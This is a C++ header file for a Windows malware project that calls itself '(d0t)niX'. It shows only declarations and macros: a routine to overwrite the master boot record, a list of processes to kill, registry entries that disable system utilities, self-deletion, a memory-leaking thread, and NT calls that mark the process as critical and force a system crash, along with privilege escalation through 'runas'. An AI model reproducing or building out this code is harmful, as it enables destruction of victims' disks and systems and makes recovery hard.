/*-----------------------------------------------------+---------------------------\
 |    ___    __________   __  ___          ______  ___ |   ___ ___      ___        |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / |  /   |   \  __| _/______  |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  | /    ~    \/ __ |\_  __ \ |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  | \    Y    / /_/ | |  | \/ |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |  \___|_  /\____ | |__|    |
 |   \__\    \/        \/     /__/      \/         \_/ |        \/      \/         |
 +-------------------------------------------+---------+---------------------------/
 | (d0t)niX.h :: (d0t)niX's main Header File |
 \-------------------------------------------*/                         #pragma once

//// Compiler/Linker ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

//// Interenal Dependencies /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Sub-Headers/settings.h"
#include "Sub-Headers/resource.h"

//// Libraries //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// CryptoAPI Library //
#pragma comment(lib, "bcrypt.lib")
// WindowsShellAPI Library //
#pragma comment(lib, "shlwapi.lib")

#if NT_FUNCTIONS == TRUE
	// NT/RTL Library //
	#pragma comment(lib, "ntdll.lib")
#endif // NT_FUNCTIONS

//// Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Standard Macros //
#define szMALWR_NAME L"(d0t)niX [.niX]"

// Error/Message -Handling Macros //
#if DEBUG_MSG == TRUE
	#define szFORMAT L"%s returned with Errorcode:\n%d : %s"
	#define cbMAX_HEAP_SIZE 0x7d0
#endif // DEBUG_MSG

// FileSystem Macros //
#define nDRIVES 0x1a * 0x4
#define nMBR_SIZE 0x200

// Registry Macros //
#define szREGISTRY_KEY L"SOFTWARE\\(d0t)niX"
#define HKLM 0x1
#define HKCU 0x2

// Utilitie Macros //
#define nMIN_RS_LEN 0x8
#define nMAX_RS_LEN 0x10
#define nMAX_BUFFER_SIZE 0x2000000
#define szHOST_MUTEX L"Global\\Win32M.(d0t)niX[.niX]:Argv:/host.Proc(running)"

#if NT_FUNCTIONS == TRUE
	// NT Macros //
	#define OPTION_SHUTDOWN_SYSTEM 0x6
	#define SE_SHUTDOWN_PRIVILEGE 0x13
	#define SE_DEBUG_PRIVILEGE 0x14
#endif // NT_FUNCTIONS

//// Wrapper Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
#if DEBUG_MSG == TRUE
	#define fnMessageHandlerW(lpCaption, lpText, lpFunction, uType, ...) fnMessageHandlerExW(lpCaption, lpText, NULL, lpFunction, uType, __VA_ARGS__)
//	#define fnMessageHandlerW(lpCaption, wTextID, lpFunction, uType, ...) fnMessageHandlerExW(lpCaption, wTextID, lpFunction, uType, __VA_ARGS__)
#else
	#define fnMessageHandlerW(lpCaption, lpText, lpFunction, uType, ...)
#endif // DEBUG_MSG
#define fnShellExecuteW(lpFile, lpParameter, lpDirectory) fnShellExecuteExW(L"runas", lpFile, lpParameter, lpDirectory, NULL, L"exefile")

//// Structures/Typedefinitions /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
typedef struct _REGLOAD {
	HKEY    hKeyHK;
	LPCWSTR lpSubKey;
	BOOL    bWow32;
	LPCWSTR lpValueName;
	DWORD   dwType;
	DWORD   dwValue;
} REGLOAD;

#if NT_FUNCTIONS == TRUE
	typedef struct {
		USHORT Length;
		USHORT MaximumLength;
		LPWSTR  Buffer;
	} UNICODE_STRING, *PUNICODE_STRING;
#endif // NT_FUNCTIONS

//// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
extern LPCWSTR lpWarningMSG;

extern const WCHAR szCharSet[];
extern const SIZE_T cculCharSet;

extern LPCWSTR lpKillProcs[];
extern const SIZE_T cculKillProcs;

extern const REGLOAD rlDisableKeys[];
extern const SIZE_T cculDisableKeys;

//// Function Declarations //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// FileSystem Functions //
BOOL fnCopyFileW(
	_In_ LPCWSTR lpMfn,
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn
);
BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>* vszDrive
);
BOOL fnDirectoryIteratorW(
	_In_    LPCWSTR                    szDir,
	_In_    LPCWSTR                    szMask,
	_Inout_ std::vector<std::wstring>* vszDir,
	_Inout_ std::vector<std::wstring>* vszFile
);
BOOL fnSelfDeleteW(VOID);
#if KILL_MBR == TRUE
	BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// CryptGenRandom Functions //
INT fnCryptGenRandomNumber(VOID);
LPWSTR fnCryptGenRandomStringW(
	_In_opt_ HANDLE  hHeap,
	_In_opt_ LPWSTR  lpBuffer,
	_In_     INT     nBufferSize,
	_In_     LPCWSTR lpCharSet,
	_In_     SIZE_T  nCharSetSize
);

#if DEBUG_MSG == TRUE
// Error/Message -Handling Function //
VOID fnMessageHandlerExW(
	_In_opt_ LPCWSTR lpCaption,
	_In_opt_ LPCWSTR lpText,
	_In_opt_ WORD    wTextID,
	_In_opt_ LPCWSTR lpFunction,
	_In_opt_ UINT    uType,
	_In_opt_         ...
);
#endif // DEBUG_MSG

#if NT_FUNCTIONS == TRUE
// NT/RTL Function Prototypes //
EXTERN_C NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(
	_In_ ULONG,
	_In_ BOOLEAN,
	_In_ BOOLEAN,
	_Out_ PBOOLEAN
);
EXTERN_C NTSYSAPI NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
	_In_ BOOLEAN,
	_Out_opt_ PBOOLEAN,
	_In_ BOOLEAN
);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtRaiseHardError(
	_In_ NTSTATUS,
	_In_ ULONG,
	_In_opt_ PUNICODE_STRING,
	_In_opt_ LPVOID*,
	_In_ UINT,
	_Out_ LPUINT
);

// NT Utilitie Functions //
BOOL fnNTSetProcessIsCritical(
	_In_ BOOLEAN blIsCritical
);
BOOL fnNTRaiseHardError(VOID);
#endif // NT_FUNCTIONS

// ProcessPersistency Functions //

// Registry Functions //
BOOL fnCreateRegistryKeyW(
	_In_     HKEY    hKeyHK,
	_In_     LPCWSTR lpSubKey,
	_In_     BOOL    bWow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD   dwType,
	_In_opt_ DWORD   dwValue
);
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
);
#if PROTECTIONS == TRUE
	BOOL fnDisableUtilities(VOID);
#endif // !DISABLE_PROTECTIONS

// ResourceUtilitie Functions //
BOOL fnExtractResourceW(
	_In_ WORD    wResID,
	_In_ LPCWSTR lpResType,
	_In_ LPCWSTR lpFileName
);
LPVOID fnLoadResourceW(
	_In_  WORD    wResID,
	_In_  LPCWSTR lpResType,
	_Out_ LPDWORD dwBufferSize
);
BOOL fnSaveResourceW(
	_In_ LPCWSTR lpFileName,
	_In_ LPVOID  lpBuffer,
	_In_ DWORD   dwBufferSize
);

// Utilitie Functions //
BOOL fnIsUserAdmin(VOID);
DWORD WINAPI thMemoryLeaker(
	_In_ LPVOID lpParam
);
BOOL fnCreateProcessExW(
	_In_     LPCWSTR lpFileName,
	_In_opt_ LPCWSTR lpCommandLine,
	_In_opt_ DWORD   dwCreationFlags,
	_In_opt_ LPCWSTR lpDirectory
);
BOOL fnShellExecuteExW(
	_In_opt_ LPCWSTR lpVerb,
	_In_     LPCWSTR lpFileName,
	_In_opt_ LPCWSTR lpParameter,
	_In_opt_ LPCWSTR lpDirectory,
	_In_opt_ INT     nShow,
	_In_opt_ LPCWSTR lpClass
);
#if SYNCHRONIZATION == TRUE
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpMutexName
);
#endif // SYNCHRONIZATION